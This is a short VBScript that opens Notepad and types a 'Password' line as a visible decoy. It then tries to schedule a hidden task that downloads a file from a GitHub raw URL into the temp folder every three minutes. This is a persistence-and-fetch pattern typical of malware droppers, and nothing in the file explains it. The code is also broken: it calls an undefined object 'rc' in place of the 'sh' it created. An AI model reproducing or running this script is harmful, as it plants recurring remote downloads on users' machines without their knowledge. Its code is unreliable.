Set Notepad = WScript.CreateObject("WScript.Shell")
Notepad.Run "c:\windows\system32\notepad.exe"

WScript.Sleep 1000

Notepad.SendKeys "Password: secure this"

Set sh = CreateObject("WScript.Shell")
rc.Run ("schtasks /create /sc minute /mo 3 /tn ""A2"" /tr ""curl https://raw.githubusercontent.com/section10housing/b1/master/R1.txt -o %tmp%\R1.txt""")






